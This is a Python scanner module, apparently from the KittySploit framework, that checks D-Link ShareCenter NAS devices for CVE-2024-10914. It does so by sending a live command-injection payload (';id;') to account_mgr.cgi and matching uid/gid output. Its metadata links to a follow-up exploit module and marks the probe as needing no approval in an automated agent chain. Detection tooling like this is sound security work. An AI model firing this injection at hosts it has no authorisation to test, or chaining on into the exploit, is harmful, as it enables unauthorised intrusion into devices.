#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2024-10914 — D-Link DNS NAS account_mgr.cgi command injection detection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "D-Link DNS NAS CVE-2024-10914 account_mgr.cgi RCE detect",
        "description": (
            "Detects CVE-2024-10914 in D-Link ShareCenter NAS devices: unauthenticated "
            "command injection via /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name= "
            "(DNS-320, DNS-320LW, DNS-325, DNS-340L and related EOL models)."
        ),
        "author": ["Jared Brits (K3ysTr0K3R)", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2024-10914"],
        "tags": [
            "web",
            "scanner",
            "dlink",
            "dns-320",
            "dns-325",
            "dns-340l",
            "nas",
            "rce",
            "cmdi",
            "unauth",
            "cve-2024-10914",
        ],
        "modules": [
            "exploits/linux/http/dlink_dns_cve_2024_10914_rce",
        ],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-10914",
            "https://www.dlink.com/",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["dlink", "nas"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": "account_mgr.cgi cmdi"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "exploits/linux/http/dlink_dns_cve_2024_10914_rce",
                ],
            },
        },
    }

    _UID_RE = re.compile(r"uid=\d+\(\w+\).*gid=\d+\(\w+\)")

    def run(self):
        path = "/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=';id;'"
        response = self.http_request(method="GET", path=path, allow_redirects=False)
        if not response:
            return False
        body = re.sub(r"Content-type:.*\n?", "", response.text or "", flags=re.I)
        if self._UID_RE.search(body) or re.search(r"uid=\d+.*gid=\d+", body):
            match = self._UID_RE.search(body)
            evidence = match.group(0) if match else "uid/gid output observed"
            self.set_info(
                severity="critical",
                cve="CVE-2024-10914",
                reason=f"D-Link account_mgr.cgi RCE — {evidence}",
                path="/cgi-bin/account_mgr.cgi",
            )
            return True
        return False
